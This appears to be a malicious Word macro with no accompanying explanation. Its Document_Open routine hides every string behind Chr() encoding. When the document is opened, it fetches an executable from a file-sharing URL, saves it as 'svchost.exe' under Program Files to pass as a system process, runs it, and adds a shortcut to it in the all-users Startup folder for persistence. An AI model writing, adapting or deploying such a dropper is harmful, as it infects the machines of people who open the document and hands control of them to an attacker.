Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
(ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, _
ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Private Sub Document_Open()
    Dim URL As String
    URL = Chr(104) + Chr(116) + Chr(116) + Chr(112) + Chr(58) + Chr(47) + Chr(47) + Chr(115) + Chr(48) + Chr(48) + Chr(48) + Chr(46) + Chr(116) + Chr(105) + Chr(110) + Chr(121) + Chr(117) + Chr(112) + Chr(108) + Chr(111) + Chr(97) + Chr(100) + Chr(46) + Chr(99) + Chr(111) + Chr(109) + Chr(47) + Chr(100) + Chr(111) + Chr(119) + Chr(110) + Chr(108) + Chr(111) + Chr(97) + Chr(100) + Chr(46) + Chr(112) + Chr(104) + Chr(112) + Chr(63) + Chr(102) + Chr(105) + Chr(108) + Chr(101) + Chr(95) + Chr(105) + Chr(100) + Chr(61) + Chr(54) + Chr(48) + Chr(53) + Chr(50) + Chr(56) + Chr(50) + Chr(57) + Chr(48) + Chr(51) + Chr(48) + Chr(53) + Chr(54) + Chr(49) + Chr(54) + Chr(49) + Chr(54) + Chr(57) + Chr(54) + Chr(48) + Chr(50) + Chr(38) + Chr(116) + Chr(61) + Chr(54) + Chr(48) + Chr(53) + Chr(50) + Chr(56) + Chr(50) + Chr(57) + Chr(48) + Chr(51) + Chr(48) + Chr(53) + Chr(54) + Chr(49) + Chr(54) + Chr(49) + Chr(54) + Chr(57) + Chr(54) + Chr(48) + Chr(50) + Chr(52) + Chr(56) + Chr(49) + Chr(50) + Chr(57)

    Dim httpReq As Object
    Set httpReq = CreateObject(Chr(77) + Chr(83) + Chr(88) + Chr(77) + Chr(76) + Chr(50) + Chr(46) + Chr(83) + Chr(101) + Chr(114) + Chr(118) + Chr(101) + Chr(114) + Chr(88) + Chr(77) + Chr(76) + Chr(72) + Chr(84) + Chr(84) + Chr(80))
    httpReq.Open Chr(71) + Chr(69) + Chr(84), URL, False
    httpReq.send

    URL = httpReq.responseBody
    If httpReq.Status = 200 Then
        Set stream = CreateObject(Chr(65) + Chr(68) + Chr(79) + Chr(68) + Chr(66) + Chr(46) + Chr(83) + Chr(116) + Chr(114) + Chr(101) + Chr(97) + Chr(109))
        stream.Type = 1
        stream.Open
        stream.Write httpReq.responseBody
        stream.SaveToFile Chr(67) + Chr(58) + Chr(92) + Chr(80) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(32) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(115) + Chr(92) + Chr(115) + Chr(118) + Chr(99) + Chr(104) + Chr(111) + Chr(115) + Chr(116) + Chr(46) + Chr(101) + Chr(120) + Chr(101), 2
        stream.Close
        
        Shell (Chr(67) + Chr(58) + Chr(92) + Chr(80) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(32) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(115) + Chr(92) + Chr(115) + Chr(118) + Chr(99) + Chr(104) + Chr(111) + Chr(115) + Chr(116) + Chr(46) + Chr(101) + Chr(120) + Chr(101))
        
        Dim WShell
        Dim Shellink As Object
        Dim loc As String
        loc = CHR(67) + CHR(58) + CHR(92) + CHR(80) + CHR(114) + CHR(111) + CHR(103) + CHR(114) + CHR(97) + CHR(109) + CHR(68) + CHR(97) + CHR(116) + CHR(97) + CHR(92) + CHR(77) + CHR(105) + CHR(99) + CHR(114) + CHR(111) + CHR(115) + CHR(111) + CHR(102) + CHR(116) + CHR(92) + CHR(87) + CHR(105) + CHR(110) + CHR(100) + CHR(111) + CHR(119) + CHR(115) + CHR(92) + CHR(83) + CHR(116) + CHR(97) + CHR(114) + CHR(116) + CHR(32) + CHR(77) + CHR(101) + CHR(110) + CHR(117) + CHR(92) + CHR(80) + CHR(114) + CHR(111) + CHR(103) + CHR(114) + CHR(97) + CHR(109) + CHR(115) + CHR(92) + CHR(83) + CHR(116) + CHR(97) + CHR(114) + CHR(116) + CHR(117) + CHR(112) + CHR(92)
        Set WShell = CreateObject(CHR(87) + CHR(115) + CHR(99) + CHR(114) + CHR(105) + CHR(112) + CHR(116) + CHR(46) + CHR(83) + CHR(104) + CHR(101) + CHR(108) + CHR(108))
        Set Shellink = WShell.CreateShortcut(loc & CHR(115) + CHR(104) + CHR(111) + CHR(114) + CHR(116) + CHR(46) + CHR(108) + CHR(110) + CHR(107))
        Shellink.TargetPath = Chr(67) + Chr(58) + Chr(92) + Chr(80) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(32) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(115) + Chr(92) + Chr(115) + Chr(118) + Chr(99) + Chr(104) + Chr(111) + Chr(115) + Chr(116) + Chr(46) + Chr(101) + Chr(120) + Chr(101)
        Shellink.Save
        Set Shellink = Nothing
    End If
End Sub